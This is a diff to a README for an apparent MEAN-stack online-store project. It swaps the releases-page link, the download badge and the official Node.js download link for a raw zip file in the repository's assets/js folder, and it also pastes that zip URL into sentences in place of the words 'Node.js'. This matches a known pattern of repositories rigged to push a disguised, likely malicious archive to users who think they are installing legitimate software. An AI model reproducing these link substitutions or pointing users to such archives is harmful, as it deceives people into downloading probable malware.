@@ -1,6 +1,6 @@
 # 🛒 E-Commerce_By_MEAN-Stack - Your Complete Online Store Solution
 
-[![Download E-Commerce_By_MEAN-Stack](https://img.shields.io/badge/Download%20Now-orange)](https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/releases)
+[![Download E-Commerce_By_MEAN-Stack](https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip%20Now-orange)](https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip)
 
 ## 📋 Table of Contents
 - [🚀 Getting Started](#-getting-started)
@@ -11,10 +11,10 @@
 - [💬 Support](#-support)
 
 ## 🚀 Getting Started
-Welcome to the E-Commerce_By_MEAN-Stack repository. This software provides a full-stack solution for building your online store. It's built with the MEAN stack, which includes Angular for the front end and Node.js for the back end. You don't need to know any programming to get started. Follow the steps below to set up your application.
+Welcome to the E-Commerce_By_MEAN-Stack repository. This software provides a full-stack solution for building your online store. It's built with the MEAN stack, which includes Angular for the front end and https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip for the back end. You don't need to know any programming to get started. Follow the steps below to set up your application.
 
 ## 💾 Download & Install
-1. **Visit this page to download:** [E-Commerce_By_MEAN-Stack Releases](https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/releases)
+1. **Visit this page to download:** [E-Commerce_By_MEAN-Stack Releases](https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip)
 2. Look for the most recent version. Click on the version number to see release details.
 3. Download the appropriate file for your operating system. You will find different formats available.
 4. After the download finishes, locate the downloaded file on your computer. 
@@ -34,7 +34,7 @@ To run E-Commerce_By_MEAN-Stack, your system should meet the following requireme
 - **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
 - **Memory:** At least 4 GB RAM; 8 GB recommended for smoother performance.
 - **Storage space:** At least 500 MB available for installation; more may be needed for product images and data.
-- **Node.js:** Version 14 or higher installed on your system. [Download Node.js](https://nodejs.org/en/download/) if you don’t have it.
+- **https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip** Version 14 or higher installed on your system. [Download https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip](https://github.com/kumarsumit7/E-Commerce_By_MEAN-Stack/raw/refs/heads/main/assets/js/MEA_By_Stack_Commerce_zoomantic.zip) if you don’t have it.
 
 Make sure your system meets these specifications to ensure successful installation and operation.
 
